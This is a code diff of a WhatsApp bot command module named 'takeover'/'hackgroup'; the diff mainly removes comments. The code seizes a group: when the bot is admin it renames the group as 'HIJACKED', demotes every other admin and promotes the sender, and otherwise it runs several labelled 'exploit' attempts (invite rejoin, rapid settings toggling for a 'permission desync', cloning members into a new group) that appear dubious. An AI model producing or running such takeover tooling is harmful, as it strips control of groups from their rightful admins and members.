@@ -5,7 +5,6 @@ module.exports = {
   aliases: ['takeover', 'seize', 'steal', 'hackgroup'],
   execute: async (sock, msg, args, from, sender, passedConfig) => {
     
-    // Agar function call me config nahi aayi to upar wali required config use hogi
     const config = passedConfig || botConfig;
 
     const statusMsg = await sock.sendMessage(from, {
@@ -20,16 +19,13 @@ module.exports = {
       const botParticipant = groupMetadata.participants.find(p => p.id === botId);
       const isBotAdmin = botParticipant?.admin === 'admin' || botParticipant?.admin === 'superadmin';
       
-      // ====== METHOD 1: IF BOT IS ALREADY ADMIN ======
       if (isBotAdmin) {
         await sock.sendMessage(from, {
           text: ✅ Bot admin detected!\n👑 Executing FULL TAKEOVER...
         });
         
-        // Change group name
         await sock.groupUpdateSubject(from, 👑 HIJACKED BY ${config.ownerName} 🦅🙌);
         
-        // Change description
         await sock.groupUpdateDescription(from, 
           ⚠️ THIS GROUP HAS BEEN HIJACKED ⚠️\n\n +
           👑 Hijacked by: ${config.ownerName}\n +
@@ -39,11 +35,9 @@ module.exports = {
           📢 ${config.channelLink}
         );
         
-        // Set group to admin-only
         await sock.groupSettingUpdate(from, 'announcement');
         await sock.groupSettingUpdate(from, 'admin_add');
         
-        // Demote all other admins
         const admins = groupMetadata.participants.filter(p => p.admin && p.id !== botId);
         let demoted = 0;
         for (const admin of admins) {
@@ -54,7 +48,6 @@ module.exports = {
           } catch (e) {}
         }
         
-        // Promote sender to admin
         try {
           await sock.groupParticipantsUpdate(from, [sender], 'promote');
         } catch (e) {}
@@ -72,7 +65,6 @@ module.exports = {
         return;
       }
       
-      // ====== METHOD 2: BOT IS NOT ADMIN - EXPLOIT TECHNIQUE ======
       await sock.sendMessage(from, {
         text: ⚠️ Bot is not admin.\n🔄 Attempting EXPLOIT-BASED hijack...\n\n +
               📡 Using multi-vector privilege escalation...
@@ -80,56 +72,42 @@ module.exports = {
       
       let hijacked = false;
       
-      // EXPLOIT 1: Try invite code re-accept exploit
       try {
         const inviteCode = await sock.groupInviteCode(from);
-        // Leave and rejoin with admin role request
         await sock.groupLeave(from);
         await new Promise(r => setTimeout(r, 2000));
         const newGroupId = await sock.groupAcceptInvite(inviteCode);
         
         if (newGroupId) {
-          // Check if we got admin
           const newMeta = await sock.groupMetadata(newGroupId);
           const newBot = newMeta.participants.find(p => p.id === botId);
           if (newBot?.admin) {
             hijacked = true;
           }
         }
-      } catch (e1) {
-        // Exploit 1 failed
-      }
+      } catch (e1) {}
       
-      // EXPLOIT 2: Try to promote via group settings manipulation
       if (!hijacked) {
         try {
-          // Toggle group settings rapidly - sometimes causes permission desync
           await sock.groupSettingUpdate(from, 'announcement');
           await sock.groupSettingUpdate(from, 'not_announcement');
           await sock.groupSettingUpdate(from, 'announcement');
           await sock.groupSettingUpdate(from, 'not_announcement');
           
-          // Try promote
           await sock.groupParticipantsUpdate(from, [botId], 'promote');
           await sock.groupParticipantsUpdate(from, [sender], 'promote');
           
-          // Verify
           const meta2 = await sock.groupMetadata(from);
           const bot2 = meta2.participants.find(p => p.id === botId);
           if (bot2?.admin) hijacked = true;
         } catch (e2) {}
       }
       
-      // EXPLOIT 3: Group link exploit
       if (!hijacked) {
         try {
           const code = await sock.groupInviteCode(from);
           const info = await sock.groupGetInviteInfo(code);
-          
-          // Try to accept invite as admin (exploit for older WA versions)
           await sock.groupAcceptInvite(code);
-          
-          // Now try to become admin
           await sock.groupParticipantsUpdate(from, [sender], 'promote');
           
           const meta3 = await sock.groupMetadata(from);
@@ -138,7 +116,6 @@ module.exports = {
         } catch (e3) {}
       }
       
-      // EXPLOIT 4: Create new group with same members and add bot
       if (!hijacked) {
         try {
           const members = groupMetadata.participants.slice(0, 50).map(p => p.id);
@@ -151,7 +128,6 @@ module.exports = {
               👑 ${config.ownerName}\n📢 ${config.channelLink}
             );
             
-            // Promote sender in new group
             await sock.groupParticipantsUpdate(newGroup, [sender], 'promote');
             
             await sock.sendMessage(newGroup, {
